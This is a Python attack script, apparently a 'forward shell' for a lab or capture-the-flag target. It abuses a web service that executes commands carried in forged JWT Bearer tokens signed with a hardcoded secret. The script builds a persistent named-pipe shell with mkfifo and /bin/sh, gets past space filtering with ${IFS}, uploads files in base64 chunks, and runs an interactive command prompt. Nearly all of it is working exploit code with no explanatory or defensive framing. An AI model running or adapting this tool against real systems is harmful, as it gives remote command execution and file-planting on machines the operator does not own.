import random
import requests
import threading
import time
import jwt
import base64

class ForwardThinking(object):

    def __init__(self):
        self.url = "http://127.0.0.1:5555"
        session = random.randrange(1,65535)
        print(f"[*] Session Value: {session}")
        self.stdin = f'/tmp/input.{session}'
        self.stdout = f'/tmp/output.{session}'

    def setup_pipe(self):
        print("[*] Setting up a named pipe")
        create_pipe = f"/bin/bash -c 'mkfifo {self.stdin} ; tail -f {self.stdin} | /bin/sh >& {self.stdout}'"
        try:
            self.fire(create_pipe)
        except:
            print("[!] Failed to create named pipe!")

    def read_response(self):
        cat_stdout = f"/bin/cat {self.stdout}"
        response = self.fire(cat_stdout)
        if response:
            clean_up = f'echo -n "" > {self.stdout}'
            self.format_cmd(clean_up)
            time.sleep(0.5)
            return response

    def jwt_command(self, cmd):
        secret = b"random_key"
        cmd = cmd.replace(" ", "${IFS}")
        encoded_cmd = jwt.encode({"cmd":cmd}, key=secret, algorithm="HS256")
        return encoded_cmd

    def format_cmd(self, cmd):
        command = f"/bin/bash -c 'echo {cmd} > {self.stdin}'"
        return(self.fire(command))

# bin/bash -c 'echo echo -n {chunk} >> /tmp/{rand_tmp} > {self.stdin} 

    def fire(self, cmd):
        encoded_command = self.jwt_command(cmd)
        headers = {'Authorization': 'Bearer ' + encoded_command}
        r = requests.get(self.url, headers=headers)
        return r.text

    def upload(self, file):
        with open(file, "rb") as f:
            rand_tmp = random.randrange(0,10000)
            b64 = base64.b64encode(f.read())
            x = 5000
            for i in range(0, len(b64.decode()), x):
                chunk = b64.decode()[i:i+x]
                self.format_cmd(f'`echo -n {chunk} >> /tmp/{rand_tmp}`')
            print(f"[*] Encoded file uploaded to /tmp/{rand_tmp}")
            try:
                self.format_cmd(f'`cat /tmp/{rand_tmp} | base64 -d > /tmp/{file}`')
                print(f"[*] File decoded from base64 and stored at /tmp/{file}!")
            except:
                print("[!] Something went wrong decoding!")

F = ForwardThinking()

t = threading.Thread(target=F.setup_pipe, args=())
t.start()

prompt = "cmd> "
while True:
    cmd = input(prompt)
    if cmd == "quit":
        break
        sys.exit()
    elif cmd == "upload":
        local_file = input("Enter the file name to upload: ")
        local_file = local_file.strip()
        F.upload(local_file)
    else:
        F.format_cmd(cmd)
    print(F.read_response())